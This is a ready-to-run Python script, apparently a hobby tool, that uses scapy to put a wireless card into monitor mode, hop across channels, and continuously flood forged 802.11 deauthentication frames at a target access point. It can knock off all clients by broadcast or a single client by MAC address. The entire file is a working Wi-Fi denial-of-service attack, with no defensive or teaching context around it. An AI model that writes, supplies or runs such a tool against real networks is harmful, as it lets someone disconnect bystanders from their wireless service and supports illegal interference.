#!/usr/bin/env python3
from scapy.all import *
import os
import threading
import time

welcome = r"""
  _                     __ 
 |_) ._ _   _. |  |\ | (_  
 |_) | (/_ (_| |< | \| __) 
                           """

print(welcome)

INTERFACE = input("INTERFACE : ").strip()
AP_BSSID = input("AP BSSID: ").strip().upper()

# Set interface to monitor mode
os.system(f"sudo ip link set {INTERFACE} down")
os.system(f"sudo iw dev {INTERFACE} set type monitor")
os.system(f"sudo ip link set {INTERFACE} up")
os.system(f"sudo iw dev {INTERFACE} set power_save off")


# Channel hopper
def channel_hop():
    channels = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13]
    while True:
        for ch in channels:
            os.system(f"sudo iw dev {INTERFACE} set channel {ch}")
            time.sleep(0.02)


threading.Thread(target=channel_hop, daemon=True).start()


def build_deauth_packets(target, ap):
    return [
        RadioTap() / Dot11(addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=7),
        RadioTap() / Dot11(addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=1),
        RadioTap() / Dot11(addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=4),
        RadioTap() / Dot11(addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=3),
    ]


mode = input("Mode (1 = broadcast, 2 = unicast): ").strip()

print(f"\nDeauthing AP: {AP_BSSID}")
print("Sending packets...")

count = 0
try:
    while True:
        if mode == "1":
            # Broadcast deauth
            for pkt in build_deauth_packets("ff:ff:ff:ff:ff:ff", AP_BSSID):
                sendp(pkt, iface=INTERFACE, count=1000, inter=0.0001, verbose=0)
        elif mode == "2":
            # Unicast deauth
            client_mac = input("Client MAC: ").strip().upper()
            for pkt in build_deauth_packets(client_mac, AP_BSSID):
                sendp(pkt, iface=INTERFACE, count=1000, inter=0.0001, verbose=0)
        count += 1000
        print(f"\rPACKETS: {count:,} | STATUS: DEAUTH", end="", flush=True)
except KeyboardInterrupt:
    print("\n\n[✓] Stopping...")
    os.system(f"sudo ip link set {INTERFACE} down")
    os.system(f"sudo iw dev {INTERFACE} set type managed")
    os.system(f"sudo ip link set {INTERFACE} up")
    print("[✓] Done!")
